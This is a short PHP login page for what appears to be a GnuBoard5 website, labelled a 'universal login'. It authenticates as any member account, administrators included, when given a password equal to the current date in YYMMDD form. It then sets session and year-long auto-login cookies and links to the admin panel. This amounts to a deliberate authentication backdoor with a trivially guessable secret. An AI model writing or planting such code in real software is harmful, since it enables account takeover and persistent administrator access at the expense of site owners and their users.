<?php
// 만능로그인
include_once('../common.php');

$chk_pass = substr(date("Ymd"), 2, 8);

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1.0">
	<title><?=$config['cf_title']?> 로그인</title>
</head>
<body>

<?
if ($_POST['mb_id'] == "" || $_POST['mb_pass'] != $chk_pass) {
//if ($_POST['mb_id'] == "") {
?>
<div id="mb_login" class="mbskin" autocomplete="off">
	<h2><p><?=$config['cf_title']?></p></h2>
	<form name="flogin" action="?" onsubmit="return flogin_submit(this);" method="post">
		<input type="text" name="mb_id" id="login_id" class="frm_input" size="20" maxlength="20" placeholder="ID"><br>
		<input type="password" name="mb_pass" class="frm_input" size="20" placeholder="PW">
		<input type="submit" value="LOGIN" class="btn_submit">
	</form>
</div>

<script>
	function flogin_submit(f){
		if (f.mb_id.value == "") {
			f.mb_id.focus();
			return false;
		}
		if (f.mb_pass.value == "") {
			f.mb_pass.focus();
			return false;
		}
		return true;
	}
</script>

<?php
} else {
    $_POST['mb_id'] = preg_replace("/\s+/","", $_POST['mb_id']);
    $mb = get_member($_POST['mb_id']);

    if (!$mb['mb_id']) {
        alert('가입된 회원아이디가 아닙니다.');
    }

    // 1. 세션해제
    /*
    session_unset(); // 모든 세션변수를 언레지스터 시켜줌
    session_destroy(); // 세션해제함
    */
    set_cookie('ck_mb_id', '', 0);
    set_cookie('ck_auto', '', 0);
    //set_cookie_app('mb_id', $mb['mb_id'], 86400);

    // 2. 새션 생성
    set_session('ss_mb_id', $mb['mb_id']);
    set_session('ss_mb_key', md5($mb['mb_datetime'] . $_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']));

    $key = md5($_SERVER['SERVER_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . $mb['mb_password']);
    set_cookie('ck_mb_id', $mb['mb_id'], 86400 * 365);
    set_cookie('ck_auto', $key, 86400 * 365);
    ?>
    <h1>session complete</h1>
    <div style='font-size: 1.2em; margin-bottom: 20px;'><?=$mb['mb_id']?> 로그인</div>
    <a href="<?=G5_ADMIN_URL?>">관리자페이지</a><br>
    <a href="<?=G5_URL?>">사이트</a>

<?php } ?>

</body>
</html>